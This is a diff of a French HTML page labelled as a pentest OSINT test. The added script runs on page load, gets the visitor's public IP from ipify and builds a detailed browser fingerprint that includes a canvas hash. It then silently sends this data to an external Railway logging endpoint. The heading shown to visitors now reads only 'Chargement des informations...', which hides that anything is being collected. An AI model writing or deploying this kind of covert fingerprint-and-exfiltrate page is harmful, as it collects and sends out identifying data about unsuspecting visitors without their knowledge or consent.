@@ -1,31 +1,75 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <title>Test OSINT</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Page de Test - Pentest OSINT</title>
 </head>
 <body>
-  <h1>Test OSINT et collecte de données</h1>
-  <p>Les données sont en cours d'envoi…</p>
+  <h1>Chargement des informations...</h1>
+  <p>Cette page est un test de récupération passive de données.</p>
 
   <script>
-    const data = {
-      userAgent: navigator.userAgent,
-      language: navigator.language,
-      platform: navigator.platform,
-      screen: {
-        width: screen.width,
-        height: screen.height,
-        orientation: screen.orientation.type
-      },
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-    };
+    async function getIPInfo() {
+      try {
+        const response = await fetch("https://api.ipify.org?format=json");
+        const data = await response.json();
+        return data.ip;
+      } catch (e) {
+        return "IP inconnue";
+      }
+    }
 
-    fetch("https://TON-SOUS-DOMAINE.up.railway.app/log", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data)
-    });
+    async function collectAndSend() {
+      const ip = await getIPInfo();
+
+      const data = {
+        ip: ip,
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory || "Inconnu",
+        screen: {
+          width: screen.width,
+          height: screen.height,
+          colorDepth: screen.colorDepth,
+          orientation: screen.orientation ? screen.orientation.type : "non supporté"
+        },
+        location: window.location.href,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookiesEnabled: navigator.cookieEnabled,
+        javaEnabled: navigator.javaEnabled && navigator.javaEnabled(),
+        touchSupport: {
+          maxTouchPoints: navigator.maxTouchPoints,
+          touchEvent: 'ontouchstart' in window,
+          pointerEvent: !!window.PointerEvent
+        },
+        canvasFingerprint: (() => {
+          try {
+            const canvas = document.createElement("canvas");
+            const ctx = canvas.getContext("2d");
+            ctx.textBaseline = "top";
+            ctx.font = "14px 'Arial'";
+            ctx.fillText("FINGERPRINT", 2, 2);
+            return canvas.toDataURL();
+          } catch {
+            return "Non disponible";
+          }
+        })(),
+        timestamp: new Date().toISOString()
+      };
+
+      fetch("https://web-production-3dcc4.up.railway.app/log", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      });
+    }
+
+    collectAndSend();
   </script>
 </body>
 </html>
